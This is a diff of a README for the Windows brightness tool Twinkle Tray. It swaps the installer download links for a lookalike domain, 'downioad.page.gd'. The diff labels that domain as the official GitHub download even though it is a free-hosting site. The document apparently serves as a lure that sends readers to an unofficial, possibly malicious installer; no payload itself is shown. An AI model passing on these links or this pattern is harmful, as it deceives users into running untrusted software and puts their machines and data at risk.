@@ -2,7 +2,7 @@
 
 Twinkle Tray is a versatile application developed for Windows 10 and 11 users to effortlessly manage monitor brightness. This tool integrates DDC-CI technology for direct hardware control, offering a seamless experience for both single and multiple display setups. Whether you're optimizing for productivity or eye comfort, Twinkle Tray provides the flexibility you need with its intuitive interface and robust feature set.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -78,7 +78,7 @@ A: Download the latest "SetupLatest.exe" from the official download page and run
 
 Get the most recent version of Twinkle Tray from the official download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 This link will always point to the latest release, ensuring you have access to the newest features and bug fixes.
 
